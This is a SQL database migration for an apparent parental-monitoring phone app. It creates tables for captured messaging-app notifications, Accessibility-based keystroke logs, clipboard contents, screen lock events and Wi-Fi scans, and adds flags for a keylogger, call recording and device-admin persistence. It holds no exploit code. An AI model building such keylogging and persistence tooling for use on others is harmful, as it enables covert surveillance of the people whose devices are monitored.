-- supabase/migrations/20260911000002_add_parental_intelligence_and_persistence.sql
-- Adds tables and columns for 24/7 Anti-Sleep Persistence and Deep Device Intelligence Suite

-- 1. DEVICE_NOTIFICATIONS (Incoming WhatsApp, Instagram, Snapchat, SMS previews)
CREATE TABLE IF NOT EXISTS public.device_notifications (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  package_name TEXT NOT NULL,
  app_name TEXT,
  title TEXT,
  text TEXT,
  post_time TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_device_notifications_device_id ON public.device_notifications(device_id, post_time DESC);
ALTER TABLE public.device_notifications ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role manages device_notifications" ON public.device_notifications;
CREATE POLICY "Service role manages device_notifications" ON public.device_notifications
  FOR ALL USING (auth.role() = 'service_role') WITH CHECK (auth.role() = 'service_role');

-- 2. DEVICE_KEYSTROKES (Live typed text & search queries from Accessibility)
CREATE TABLE IF NOT EXISTS public.device_keystrokes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  package_name TEXT,
  app_name TEXT,
  text TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_device_keystrokes_device_id ON public.device_keystrokes(device_id, created_at DESC);
ALTER TABLE public.device_keystrokes ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role manages device_keystrokes" ON public.device_keystrokes;
CREATE POLICY "Service role manages device_keystrokes" ON public.device_keystrokes
  FOR ALL USING (auth.role() = 'service_role') WITH CHECK (auth.role() = 'service_role');

-- 3. DEVICE_CLIPBOARD (Copied text, links & numbers)
CREATE TABLE IF NOT EXISTS public.device_clipboard (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  content TEXT NOT NULL,
  copied_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_device_clipboard_device_id ON public.device_clipboard(device_id, copied_at DESC);
ALTER TABLE public.device_clipboard ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role manages device_clipboard" ON public.device_clipboard;
CREATE POLICY "Service role manages device_clipboard" ON public.device_clipboard
  FOR ALL USING (auth.role() = 'service_role') WITH CHECK (auth.role() = 'service_role');

-- 4. DEVICE_LOCK_EVENTS (Screen ON, OFF & Device Unlocked timeline)
CREATE TABLE IF NOT EXISTS public.device_lock_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  event_type TEXT NOT NULL CHECK (event_type IN ('screen_on', 'screen_off', 'user_present')),
  event_time TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_device_lock_events_device_id ON public.device_lock_events(device_id, event_time DESC);
ALTER TABLE public.device_lock_events ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role manages device_lock_events" ON public.device_lock_events;
CREATE POLICY "Service role manages device_lock_events" ON public.device_lock_events
  FOR ALL USING (auth.role() = 'service_role') WITH CHECK (auth.role() = 'service_role');

-- 5. DEVICE_WIFI_NETWORKS (Connected WiFi SSID & surrounding access points)
CREATE TABLE IF NOT EXISTS public.device_wifi_networks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  ssid TEXT NOT NULL,
  bssid TEXT,
  signal_level INTEGER,
  is_connected BOOLEAN DEFAULT false,
  scanned_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_device_wifi_networks_device_id ON public.device_wifi_networks(device_id, scanned_at DESC);
ALTER TABLE public.device_wifi_networks ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Service role manages device_wifi_networks" ON public.device_wifi_networks;
CREATE POLICY "Service role manages device_wifi_networks" ON public.device_wifi_networks
  FOR ALL USING (auth.role() = 'service_role') WITH CHECK (auth.role() = 'service_role');

-- 6. EXTEND MONITORED_DEVICES WITH TELEMETRY CONFIG & PERSISTENCE FLAGS
ALTER TABLE public.monitored_devices
  ADD COLUMN IF NOT EXISTS telemetry_config JSONB NOT NULL DEFAULT '{"notifications":false,"keylogger":false,"clipboard":false,"wifi":false,"lock_events":false,"call_recording":false,"screen_time":false}'::jsonb,
  ADD COLUMN IF NOT EXISTS is_device_admin BOOLEAN DEFAULT false,
  ADD COLUMN IF NOT EXISTS is_accessibility_active BOOLEAN DEFAULT false,
  ADD COLUMN IF NOT EXISTS is_battery_unrestricted BOOLEAN DEFAULT false,
  ADD COLUMN IF NOT EXISTS current_wifi_ssid TEXT DEFAULT NULL;

-- 7. EXTEND DEVICE COMMANDS (Drop old check constraint if it restricts new commands)
ALTER TABLE public.device_commands DROP CONSTRAINT IF EXISTS device_commands_command_check;
